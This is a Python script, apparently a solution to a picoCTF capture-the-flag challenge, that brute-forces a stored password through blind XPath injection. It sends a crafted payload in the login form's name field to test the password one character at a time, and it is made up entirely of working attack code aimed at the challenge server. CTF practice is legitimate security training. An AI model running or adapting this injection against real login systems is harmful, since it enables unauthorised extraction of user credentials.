from pwn import *
import requests
import string
import urllib

user_id = 3
password = ""

with log.progress('Brute-forcing password') as p:
    index = 1
    while not password.endswith("}"):
        for c in string.ascii_letters + "{}_"  + string.digits:
            p.status(f"Index: {index}, known password: '{password}', trying: '{c}'")
            r = requests.post("http://mercury.picoctf.net:7029/", data = {"name": f"' or substring(//user[position()={user_id}]/pass,{index},1)='{c}' or 'a'='", "pass": "test"})
            if "right" in r.text:
                password += c
                break
        else:
            print(f"Can't find character for index {index}!")
            break

        index += 1
        

print(f"Password: {password}")